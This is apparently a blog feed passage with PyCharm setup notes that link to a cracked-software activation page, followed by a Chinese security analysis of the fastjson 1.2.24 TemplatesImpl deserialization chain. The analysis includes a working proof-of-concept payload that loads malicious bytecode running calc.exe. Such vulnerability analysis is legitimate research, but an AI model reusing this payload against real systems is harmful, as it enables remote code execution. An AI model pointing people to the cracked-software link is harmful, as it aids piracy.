        <content type="html"><![CDATA[<ul><li><a href="#破解版安装">破解版安装</a></li><li><a href="#插件推荐">插件推荐</a></li><li><a href="#py解释器和虚拟环境">py解释器和虚拟环境</a><ul><li><a href="#虚拟解释器和机器系统的解释器不同包环境不同">虚拟解释器和机器系统的解释器不同，包环境不同</a></li><li><a href="#使用pycharm手动安装包环境">使用pycharm手动安装包环境</a></li></ul></li><li><a href="#结合conda创建新版本的python解释器并配置到pycharm">结合conda创建新版本的python解释器并配置到pycharm</a></li><li><a href="#代码行数统计">代码行数统计</a></li><li><a href="#profile">profile</a></li><li><a href="#常用快捷键">常用快捷键</a></li><li><a href="#增加sftp部署">增加SFTP部署</a></li><li><a href="#函数文档">函数文档</a><ul><li><a href="#实际示例">实际示例</a></li></ul></li><li><a href="#正确的增加远程python解释器">正确的增加远程python解释器</a><ul><li><a href="#坑点pycharmcant-get-remote-credentials-for-deployment-server">坑点：Pycharm:Can’t get remote credentials for deployment server</a></li></ul></li><li><a href="#将项目启用为django支持">将项目启用为django支持</a></li></ul><h1 id="破解版安装"><a href="#破解版安装" class="headerlink" title="破解版安装"></a>破解版安装</h1><p>pycharm: <a href="https://www.exception.site/essay/pycharm-pojie-jihuoma">https://www.exception.site/essay/pycharm-pojie-jihuoma</a></p><h1 id="插件推荐"><a href="#插件推荐" class="headerlink" title="插件推荐"></a>插件推荐</h1><pre><code>汉化statisticrainbow brackets(部分功能30天限制，经常让你买注册码，已弃用)markdown（其实vscode的md阅览比pycharm的要很快，这个自行选择）code glance (强烈推荐，右侧滚动条变小地图)translation</code></pre><h1 id="py解释器和虚拟环境"><a href="#py解释器和虚拟环境" class="headerlink" title="py解释器和虚拟环境"></a>py解释器和虚拟环境</h1><h3 id="虚拟解释器和机器系统的解释器不同，包环境不同"><a href="#虚拟解释器和机器系统的解释器不同，包环境不同" class="headerlink" title="虚拟解释器和机器系统的解释器不同，包环境不同"></a>虚拟解释器和机器系统的解释器不同，包环境不同</h3><p>创建一个新的项目，会想创建venv的虚拟解释器和库包<br>会根据系统现有的py复制一个<br>但是库文件是不同的，因为环境不同，如图：</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-24-45.png" alt="2024-04-10-22-24-45"></p><h3 id="使用pycharm手动安装包环境"><a href="#使用pycharm手动安装包环境" class="headerlink" title="使用pycharm手动安装包环境"></a>使用pycharm手动安装包环境</h3><p><strong>目前我指定虚拟解释器的py环境路径 直接 install -r requirements.txt 失败，推测requirements的版本不太对，是pycharm不支持的包版本</strong></p><p>但是我是用pycharm的设置 -&gt; 项目  -&gt; py解释器 手动安装包是可以的<br>此处也容易显示版本</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-25-40.png" alt="2024-04-10-22-25-40"></p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-25-56.png" alt="2024-04-10-22-25-56"></p><p>成功解决虚拟环境运行django项目</p><p>可以正常启动</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-26-26.png" alt="2024-04-10-22-26-26"></p><h1 id="结合conda创建新版本的python解释器并配置到pycharm"><a href="#结合conda创建新版本的python解释器并配置到pycharm" class="headerlink" title="结合conda创建新版本的python解释器并配置到pycharm"></a>结合conda创建新版本的python解释器并配置到pycharm</h1><p><strong>我思考了下，pycharm本身无法直接下载python3的不同版本，而手动从python官网下载不同的python3版本，操作还是太麻烦。此处依赖conda能自动下载不同python3版本，以及pycharm可以指定conda下载的py复制解释器到不同的项目，并处理不同的包依赖，可以使得调试不同项目的python解释器版本、包依赖相对分离。唯一缺点就是，软件重复程序冗余程度较高，但是这是pip自身设计的问题。</strong></p><p>不清楚为什么pycharm直接加载conda的解释器，会出现各种网络问题</p><p>因此手动执行命令：</p><pre><code>conda.exe create -p E:\anaconda3\envs\yolov5\envs -y python=3.10</code></pre><p>（若此命令出现网络问题，参考conda的安装、运行一节的报错处理）</p><p>然后pycharm添加该环境下的venv解释器（非conda环境）：</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-27-33.png" alt="2024-04-10-22-27-33"></p><p>相当于，conda的目录下弄了py3.10，然后又在这个代码项目下的env复制了解释器，和弄了包依赖的东西</p><p>最后手动执行命令（用户加目录下的pip的换源配置文件有效）：</p><pre><code>python -m pip install -r C:\Users\ranja\Desktop\ToStudy\yolov5\requirements.txt</code></pre><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-27-59.png" alt="2024-04-10-22-27-59"></p><p>最终等待此处完成即可。</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-28-25.png" alt="2024-04-10-22-28-25"></p><p>如果pycharm检查到安装包的版本需要更新，则更新。</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-28-56.png" alt="2024-04-10-22-28-56"></p><p>至此，解释器设置成功，按住ctrl，鼠标移动到任何函数代码，都显示可调式的高亮。</p><h1 id="代码行数统计"><a href="#代码行数统计" class="headerlink" title="代码行数统计"></a>代码行数统计</h1><p>安装插件  statistic</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-29-28.png" alt="2024-04-10-22-29-28"></p><p>可以统计当前项目的不同类型代码、统计规则</p><h1 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h1><p>使用profile检查各函数、模块的运行时间、调用次数，这个可以用来排查程序中哪个地方出现问题、短板。</p><p>比如之前在写大数中素数分解的代码时，我使用profile检查素数分解模块的运行效率，来比对不同代码算法下，这个模块是否存在优化可能。</p><p>右上角编辑调试器右侧，有个<code>profile</code>，这个就是用来分析当前程序的。</p><p><img src="/2024/04/08/Python/pycharm/2024-10-11-12-27-41.png" alt></p><h1 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h1><p>ctrl alt shift x 部署</p><h1 id="增加SFTP部署"><a href="#增加SFTP部署" class="headerlink" title="增加SFTP部署"></a>增加SFTP部署</h1><p>点击 IDEA 的文件 -&gt; 设置 -&gt; 项目，如图</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-30-04.png" alt="2024-04-10-22-30-04"></p><p>点击加号减号就可以新增部署。如果部署中没有目标的SSH，则需要先添加“python解释器”，远程解释器里写新的SSH，这里的部署才会有新的SSH账密连接。</p><h1 id="函数文档"><a href="#函数文档" class="headerlink" title="函数文档"></a>函数文档</h1><p>在Python中，函数的文档字符串（docstring）通常被用来描述函数的功能、参数、返回值以及可能的异常等信息。这些文档字符串被包裹在一对三个双引号之间。</p><p>一种常见的格式是reStructuredText（reST）格式，这是Python的官方文档所使用的格式。在reST格式下，函数的参数（param）和返回值（return）可以这样标注：</p><pre><code>def function_name(param1, param2):    &quot;&quot;&quot;    这是一个函数的简单描述。    :param param1: 这是param1的描述。    :type param1: 这是param1的类型。    :param param2: 这是param2的描述。    :type param2: 这是param2的类型。    :return: 这是返回值的描述。    :rtype: 这是返回值的类型。    &quot;&quot;&quot;    pass</code></pre><p>此外，你也可以使用Google或NumPy风格的docstring。这是Google风格的例子：</p><pre><code>def function_name(param1, param2):    &quot;&quot;&quot;    这是一个函数的简单描述。    Args:        param1 (type): 这是param1的描述。        param2 (type): 这是param2的描述。    Returns:        type: 这是返回值的描述。    &quot;&quot;&quot;    pass</code></pre><p>PyCharm和其他一些IDE支持这些格式，并可以根据docstring生成相应的函数/方法签名和文档。</p><h3 id="实际示例"><a href="#实际示例" class="headerlink" title="实际示例"></a>实际示例</h3><pre><code>def timeCompare(time1, time2):    &quot;&quot;&quot;用于比较两个类似&#39;2023-05-17&#39;的时间戳字符串看谁更早。time1如果比time2更早或同天的话，返回True；否则返回False    Args:        time1 (str):传入类似&#39;2023-05-17&#39;的时间字符串        time2 (str):传入类似&#39;2023-05-17&#39;的时间字符串    Return:        res (bool):        &quot;&quot;&quot;    datetime1 = datetime.strptime(time1, &#39;%Y-%m-%d&#39;)    datetime2 = datetime.strptime(time2, &#39;%Y-%m-%d&#39;)    if datetime1 &lt;= datetime2:        return True    else:        return Falsedef singleCveHrefSpider(avd_url, session):    &quot;&quot;&quot;使用avd编号，匹配单个漏洞详情页的数据    Args:        avd_url(str): avd漏洞的链接地址        session(requests.Session): 用于网络IO的session    Returns:        res(dict): 返回无键默认None的字典        &quot;&quot;&quot;</code></pre><h1 id="正确的增加远程python解释器"><a href="#正确的增加远程python解释器" class="headerlink" title="正确的增加远程python解释器"></a>正确的增加远程python解释器</h1><p>总结：<br>1.py解释器中的上传目录通常是默认传到/tmp/pycharmxxxx中，这个无所谓，改为正确的上传路径即可。<br>2.<code>部署</code>改成正确的上传路径<br>3.<code>py解释器</code>中的路径映射写对，就可以远程调试了。</p><p>设置 -&gt; 项目 -&gt; python解释器</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-31-57.png" alt="2024-04-10-22-31-57"></p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-32-10.png" alt="2024-04-10-22-32-10"></p><p>这里可以改为正确的路径，不一定非得下面的 /tmp 路径</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-32-34.png" alt="2024-04-10-22-32-34"></p><p>映射路径选择本地路径就可以。如果解释器的映射路径不对，那回到上图改一下，再到这里选择正确的本地路径就可以进行远程调试了。</p><p>Py解释器中的路径映射填写正确，就可以正常进行远程调试了。</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-33-14.png" alt="2024-04-10-22-33-14"></p><h3 id="坑点：Pycharm-Can’t-get-remote-credentials-for-deployment-server"><a href="#坑点：Pycharm-Can’t-get-remote-credentials-for-deployment-server" class="headerlink" title="坑点：Pycharm:Can’t get remote credentials for deployment server"></a>坑点：Pycharm:Can’t get remote credentials for deployment server</h3><p>不知道为啥我会遇到这个报错，去项目，python解释器，把现有的SSH解释器删除了，重新添加，就没问题了</p><h1 id="将项目启用为django支持"><a href="#将项目启用为django支持" class="headerlink" title="将项目启用为django支持"></a>将项目启用为django支持</h1><p>首先启用django支持，在 设置 –&gt;  语言和框架   Django  勾选“启用Django支持”</p><p>配置如下</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-33-54.png" alt="2024-04-10-22-33-54"></p><p>然后要运行，就点击调试配置器</p><p><img src="/2024/04/08/Python/pycharm/2024-04-10-22-34-08.png" alt="2024-04-10-22-34-08"></p><p>直接配置后，运行即可</p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>fastjson1.2.24 TemplatesImpl EXP analysis</title>
      <link href="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/"/>
      <url>/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/</url>
      
        <content type="html"><![CDATA[<p>First published: <a href="https://mp.weixin.qq.com/s/8recPwGFPwCcB7x0ANOfwA">比瓴科技 攻防演练期间高风险组件漏洞分析系列：fastjson1.2.24 TemplatesImpl 利用链分析</a></p><ul><li><a href="#1-导语">1 导语</a></li><li><a href="#2-实验环境">2 实验环境</a></li><li><a href="#3-poc复现过程">3 POC复现过程</a><ul><li><a href="#31引入依赖">3.1引入依赖</a></li><li><a href="#32构造恶意类">3.2构造恶意类</a></li><li><a href="#33将恶意类编译字节码">3.3将恶意类编译字节码</a></li><li><a href="#34-base64编码evilclassclass">3.4 base64编码EvilClass.class</a></li><li><a href="#35-poc">3.5 POC</a></li></ul></li><li><a href="#4-正向分析">4 正向分析</a><ul><li><a href="#41-分析templatesimpl">4.1 分析TemplatesImpl</a><ul><li><a href="#1classloader类加载器">1、ClassLoader:类加载器</a></li><li><a href="#2-重写classloader读取字节码加载类">2、 重写ClassLoader，读取字节码，加载类</a></li><li><a href="#3templatesimpl重写defineclass方法">3、TemplatesImpl重写defineClass方法</a></li><li><a href="#4调用链发现">4、调用链发现</a></li><li><a href="#5找newtransformer的正确调用路径过滤结果">5、找newTransformer()的正确调用路径，过滤结果</a></li></ul></li><li><a href="#42-fastjson为什么需要使用type键触发">4.2 fastjson为什么需要使用@type键触发</a></li><li><a href="#43-分析如何构造payload">4.3 分析：如何构造payload</a></li><li><a href="#44-漏洞风险">4.4 漏洞风险</a></li></ul></li><li><a href="#5-对开发安全的启示">5 对开发安全的启示</a></li></ul><h1 id="1-导语"><a href="#1-导语" class="headerlink" title="1 导语"></a>1 导语</h1><p>fastjson是HVV行动中几乎最为常见的风险组件，在maven库中收录的直接关联CVE编号有两个：CVE-2017-18349和CVE-2022-25845；未被CVE收录的特定触发情景的payload也有多个。最近在优化我司组件可达性检测引擎时，复盘fastjson多个版本的挖掘和绕过思路，受益匪浅。</p><p>从开发角度看，fastjson是阿里团队从底层构建的解决JSON功能的组件，代码开源、使用简单，对大型json数据支持速度快，并支持额外场景下的序列化能力。因此，fastjson组件被广泛引用。</p><p>从漏洞分析角度看，fastjson组件本身并非单纯的RCE漏洞，须具备特定情境才可触发；fastjson调用链长，需逐步调试去理解调用关系；对java runtime的类加载器ClassLoader需理解原理；官方修复思路和漏洞挖掘者的绕过思路持续了整整1.2.2x到1.2.8x多个版本，思路清晰巧妙，是经典的代码审计素材。</p><p>本文以CVE-2017-18349的TemplatesImpl调用链分析，该漏洞触发有三条链，本文仅分析 getOutputProperties()调用链。本文会更多的从原理和正向挖掘的角度，展示对漏洞的审计思路。</p><h1 id="2-实验环境"><a href="#2-实验环境" class="headerlink" title="2 实验环境"></a>2 实验环境</h1><pre><code>JDK版本：jdk1.8u144fastjson 1.2.24:git: https://github.com/alibaba/fastjson commit id: fbba126（注：此漏洞需fastjson版本1.2.22(含)到1.2.24(含)，1.2.21和1.2.23无法触发）</code></pre><h1 id="3-POC复现过程"><a href="#3-POC复现过程" class="headerlink" title="3 POC复现过程"></a>3 POC复现过程</h1><h3 id="3-1引入依赖"><a href="#3-1引入依赖" class="headerlink" title="3.1引入依赖"></a>3.1引入依赖</h3><p>pom.xml中引入fastjson 1.2.24的依赖。</p><pre><code>&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;fastjson&lt;/artifactId&gt;&lt;version&gt;1.2.24&lt;/version&gt;&lt;/dependency&gt;</code></pre><h3 id="3-2构造恶意类"><a href="#3-2构造恶意类" class="headerlink" title="3.2构造恶意类"></a>3.2构造恶意类</h3><p>代码如下，构造EvilClass，并创建构造函数，命令执行calc.exe弹出一个计算机程序。</p><pre><code>package org.example;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class EvilClass extends AbstractTranslet &#123;public EvilClass() throws IOException &#123;        Runtime.getRuntime().exec(&quot;calc.exe&quot;);    &#125;@Overridepublic void transform(DOM document, SerializationHandler[] handlers) throws TransletException&#123;    &#125;public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException&#123;    &#125;&#125;</code></pre><h3 id="3-3将恶意类编译字节码"><a href="#3-3将恶意类编译字节码" class="headerlink" title="3.3将恶意类编译字节码"></a>3.3将恶意类编译字节码</h3><p>切入EvilClass.java所在目录，执行命令：</p><pre><code>&quot;C:\Program Files\Java\jdk1.8.0_102\bin\javac.exe&quot;   EvilClass.java</code></pre><p>如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-32-18.png" alt="2024-04-14-12-32-18"></p><h3 id="3-4-base64编码EvilClass-class"><a href="#3-4-base64编码EvilClass-class" class="headerlink" title="3.4 base64编码EvilClass.class"></a>3.4 base64编码EvilClass.class</h3><p>使用如下程序输出字节码的编码内容：</p><pre><code>package org.example;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.util.Base64;public class printEncodeClassByteCode &#123;public static void main(String args[]) &#123;byte[] buffer = null;        String filepath = &quot;C:\\Users\\ranja\\Desktop\\工作任务\\javaComponentTestDemo\\src\\main\\java\\org\\example\\EvilClass.class&quot;;try &#123;            FileInputStream fis = new FileInputStream(filepath);            ByteArrayOutputStream bos = new ByteArrayOutputStream();byte[] b = new byte[1024];int n;while((n = fis.read(b))!=-1) &#123;                bos.write(b,0,n);            &#125;            fis.close();            bos.close();            buffer = bos.toByteArray();        &#125;catch(Exception e) &#123;            e.printStackTrace();        &#125;        Base64.Encoder encoder = Base64.getEncoder();        String value = encoder.encodeToString(buffer);        System.out.println(value);    &#125;&#125;</code></pre><p>输出：</p><pre><code>yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==</code></pre><h3 id="3-5-POC"><a href="#3-5-POC" class="headerlink" title="3.5 POC"></a>3.5 POC</h3><pre><code>package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;public class POC1 &#123;public static void main(String[] args) &#123;String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAA5FdmlsQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAAhjYWxjLmV4ZQwAHwAgAQAVb3JnL2V4YW1wbGUvRXZpbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==\&quot;], \&quot;_name\&quot;:\&quot;\&quot;, \&quot;_tfactory\&quot;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;&#125;&quot;;JSON.parseObject(payload, Feature.SupportNonPublicField);    &#125;&#125;</code></pre><p>运行，弹出计算器，如图：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-35-01.png" alt="2024-04-14-12-35-01"></p><h1 id="4-正向分析"><a href="#4-正向分析" class="headerlink" title="4 正向分析"></a>4 正向分析</h1><h3 id="4-1-分析TemplatesImpl"><a href="#4-1-分析TemplatesImpl" class="headerlink" title="4.1 分析TemplatesImpl"></a>4.1 分析TemplatesImpl</h3><h5 id="1、ClassLoader-类加载器"><a href="#1、ClassLoader-类加载器" class="headerlink" title="1、ClassLoader:类加载器"></a>1、ClassLoader:类加载器</h5><p>解释TemplatesImpl漏洞调用链，首先需要简单说明ClassLoader的运行机制。因为造成漏洞的根本原因，是由于TemplatesImpl继承ClassLoader并重写了defineClass方法拥有了类加载器的能力。</p><p>java的类加载器是ClassLoader，主要用于加载.class字节码文件的类到内存。其使用的主要成员方法是findLoadedClass()、loadClass()、findClass()、defineClass()，使用伪代码表示大概关系：</p><pre><code>public abstract class ClassLoader &#123;public Class&lt;?&gt; loadClass(String name)&#123;// 查找这个类是否已经加载了        Class&lt;?&gt; cls = findLoadedClass(name);if (cls == null) &#123;// 使用父加载器尝试加载类            cls = parent.loadClass(name);// 父加载器加载失败，说明是外部自定义类，调用findClass加载字节码的类if (cls == null) &#123;                cls = findClass(name);            &#125;        &#125;return cls;    &#125;protected Class&lt;?&gt; findClass(String name)&#123;        Class cls = null; // 读取命名空间的class字节码        String classPath = dirPath + &quot;/&quot; + name.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;        byte[] data = getClassFileBytes(classPath);// 使用defineClass方法加载字节码，返回类        cls = defineClass(name, data, 0, data.length);return cls;    &#125;&#125;</code></pre><h5 id="2、-重写ClassLoader，读取字节码，加载类"><a href="#2、-重写ClassLoader，读取字节码，加载类" class="headerlink" title="2、 重写ClassLoader，读取字节码，加载类"></a>2、 重写ClassLoader，读取字节码，加载类</h5><p>我在外部文件重写了ClassLoader去加载、运行上文payload的EvilClass.class字节码，弹出计算器，代码如下：</p><pre><code>CustomClassLoader.javapackage org.example;import java.io.ByteArrayOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.nio.ByteBuffer;import java.nio.channels.Channels;import java.nio.channels.FileChannel;import java.nio.channels.WritableByteChannel;public class CustomClassLoader extends ClassLoader &#123;private String dirPath;public CustomClassLoader(String dirPath) &#123;this.dirPath = dirPath;    &#125;public CustomClassLoader(ClassLoader parent, String dirPath) &#123;super(parent);this.dirPath = dirPath;    &#125;@Overridepublic Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;// 查找这个类是否加载了        Class&lt;?&gt; cls = findLoadedClass(name);if (cls == null) &#123;// 获取到父加载器            ClassLoader parent = this.getParent();try &#123;// 委派给父加载器加载                cls = parent.loadClass(name);            &#125; catch (ClassNotFoundException e) &#123;//                ignore            &#125;if (cls == null) &#123;                cls = findClass(name);            &#125;        &#125;return cls;    &#125;@Overrideprotected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;        Class cls = null;try &#123;            String classPath = dirPath + &quot;/&quot; + name.replace(&#39;.&#39;, &#39;/&#39;) + &quot;.class&quot;;byte[] data = getClassFileBytes(classPath);if (data == null) &#123;throw new ClassNotFoundException();            &#125;            cls = defineClass(name, data, 0, data.length);if (cls == null) &#123;throw new ClassFormatError();            &#125;        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;return cls;    &#125;private byte[] getClassFileBytes(String classFile) throws IOException, IOException &#123;        FileInputStream fis = new FileInputStream(classFile);        FileChannel fileChannel = fis.getChannel();        ByteArrayOutputStream baos = new ByteArrayOutputStream();        WritableByteChannel outC = Channels.newChannel(baos);        ByteBuffer buffer = ByteBuffer.allocateDirect(1024);while (true) &#123;int i = fileChannel.read(buffer);if (i == 0 || i == -1) &#123;break;            &#125;            buffer.flip();            outC.write(buffer);            buffer.clear();        &#125;        fis.close();return baos.toByteArray();    &#125;public static void main(String[] args)&#123;        String dirPath = &quot;C:\\Users\\ranja\\Desktop\\工作任务\\javaComponentTestDemo\\src\\main\\java&quot;; // 替换为你的目录路径        String className = &quot;org.example.EvilClass&quot;; // 替换为你的类名        CustomClassLoader customClassLoader = new CustomClassLoader(dirPath);try &#123;            Class&lt;?&gt; cls = customClassLoader.loadClass(className);// 使用加载的类进行操作            Object obj = cls.getDeclaredConstructor().newInstance(); // 实例化类对象        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>运行后弹出计算器，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-36-31.png" alt="2024-04-14-12-36-31"></p><h5 id="3、TemplatesImpl重写defineClass方法"><a href="#3、TemplatesImpl重写defineClass方法" class="headerlink" title="3、TemplatesImpl重写defineClass方法"></a>3、TemplatesImpl重写defineClass方法</h5><p>在com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java重写了ClassLoader，如下：</p><pre><code>static final class TransletClassLoader extends ClassLoader &#123;private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;    TransletClassLoader(ClassLoader parent) &#123;super(parent);        _loadedExternalExtensionFunctions = null;    &#125;    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;super(parent);        _loadedExternalExtensionFunctions = mapEF;    &#125;public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;        Class&lt;?&gt; ret = null;// The _loadedExternalExtensionFunctions will be empty when the// SecurityManager is not set and the FSP is turned offif (_loadedExternalExtensionFunctions != null) &#123;            ret = _loadedExternalExtensionFunctions.get(name);        &#125;if (ret == null) &#123;            ret = super.loadClass(name);        &#125;return ret;    &#125;/**    * Access to final protected superclass member from outer class.    */Class defineClass(final byte[] b) &#123;return defineClass(null, b, 0, b.length);    &#125;&#125;</code></pre><p>对用于加载字节码功能的defineClass方法的重写未标明访问修饰符，使得该方法的访问权限是default，可以被同包的其他类访问，这是调用链最底层的开始。</p><p>回到com/sun/org/apache/xalan/internal/xsltc/trax/TemplatesImpl.java第455行，看defineClass之外，代码对类反序列化的处理，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-37-19.png" alt="2024-04-14-12-37-19"></p><p>可以看到限制了反序列化的类型为AbstractTranslet，跟进该类型，如下：</p><pre><code>public abstract class AbstractTranslet implements Translet</code></pre><p>可知反序列化限制类型为AbstractTranslet的子类。</p><h5 id="4、调用链发现"><a href="#4、调用链发现" class="headerlink" title="4、调用链发现"></a>4、调用链发现</h5><p>对defineClass按下Alt+F7（查找用法），找到defineTransletClasses()，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-37-45.png" alt="2024-04-14-12-37-45"></p><p>对defineTransletClasses()继续跟进“查找用法”，发现三处调用：</p><pre><code>public synchronized int getTransletIndex()private synchronized Class[] getTransletClasses()private Translet getTransletInstance()</code></pre><p>如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-12-38-25.png" alt="2024-04-14-12-38-25"></p><p>本文仅分析其中的private Translet getTransletInstance()这条链。在getTransletInstance()要调用到defineTransletClasses()，需要满足_name不为null且_class是null的条件。如图：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-13-30.png" alt="2024-04-14-13-13-30"></p><p>对getTransletInstance()查找用法，跟进到public synchronized Transformer newTransformer()，如图：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-14-06.png" alt="2024-04-14-13-14-06"></p><p>对newTransformer()查找用法，会发现多个调用结果，如图所示：</p><p><img src="/2023/07/06/code_audit/fastjson1.2.24TemplatesImpl/2024-04-14-13-14-32.png" alt="2024-04-14-13-14-32"></p><h5 id="5、找newTransformer-的正确调用路径，过滤结果"><a href="#5、找newTransformer-的正确调用路径，过滤结果" class="headerlink" 